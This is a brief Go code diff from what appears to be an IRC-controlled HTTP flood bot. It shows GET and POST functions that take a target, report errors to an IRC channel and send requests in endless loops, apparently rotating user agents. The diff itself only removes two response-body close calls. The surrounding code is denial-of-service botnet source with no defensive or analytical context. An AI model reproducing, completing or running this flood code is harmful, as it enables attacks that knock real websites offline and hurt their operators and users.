@@ -28,7 +28,6 @@ func GET(getTarget, set_chan string, reportIRC net.Conn) {
 		IRC_Report(reportIRC, set_chan, err.Error())
 	}
 	_get := &http.Client{}
-	defer get_request.Body.Close()
 
 	for {
 		for i := range agent_slice {
@@ -53,7 +52,6 @@ func POST(postTarget, set_chan string, reportIRC net.Conn) {
 		IRC_Report(reportIRC, set_chan, err.Error())
 	}
 	_post := &http.Client{}
-	defer post_request.Body.Close()
 
 	for {
 		_post.Do(post_request)
